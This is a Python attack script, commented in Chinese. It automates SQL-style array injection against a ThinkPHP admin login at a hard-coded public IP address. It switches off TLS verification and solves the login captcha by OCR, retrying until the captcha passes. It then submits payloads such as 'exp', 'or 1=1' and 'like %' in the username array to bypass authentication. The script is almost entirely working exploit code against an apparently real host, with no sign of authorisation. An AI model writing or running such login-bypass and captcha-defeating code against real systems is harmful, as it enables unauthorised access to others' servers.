#!/usr/bin/env python3
"""TP数组注入测试(带验证码)"""
import urllib.request, http.cookiejar, ssl, sys, time
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"
ocr = ddddocr.DdddOcr(show_ad=False)

def get_captcha():
    try:
        r = op.open(f"{B}/customer/admin/verify.html", timeout=10)
        return r.read()
    except Exception:
        return None

def try_payload(payload, max_attempts=15):
    """重试直到验证码通过, 返回响应"""
    for i in range(max_attempts):
        cap = get_captcha()
        if cap is None: time.sleep(1); continue
        try: code = ocr.classification(cap)
        except Exception: continue
        if len(code) != 4: continue
        data = f"{payload}&password=123456&verify={code}".encode()
        try:
            r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=10)
            body = r.read().decode("utf-8","ignore")
            if "验证码" in body: continue
            return body
        except Exception:
            return "HTTP500"
        time.sleep(0.1)
    return "VERIFY_FAIL"

payloads = [
    ("username[0]=exp&username[1]=1", "exp注入"),
    ("username[0]=exp&username[1]==1", "exp=1"),
    ("username[0]=like&username[1]=%25", "like%"),
    ("username[0]=or&username[1]=1=1", "or 1=1"),
    ("username[0]=GT&username[1]=0", "GT 0"),
    ("username[0]=not null&username[1]=", "not null"),
    ("username[0]=exp&username[1]=='1' or '1'='1", "or注入"),
]

for payload, desc in payloads:
    r = try_payload(payload)
    print(f"[{desc}] {payload}: {r[:120]}", flush=True)

# 正常admin对照
r = try_payload("username=admin")
print(f"[对照admin] : {r[:120]}", flush=True)
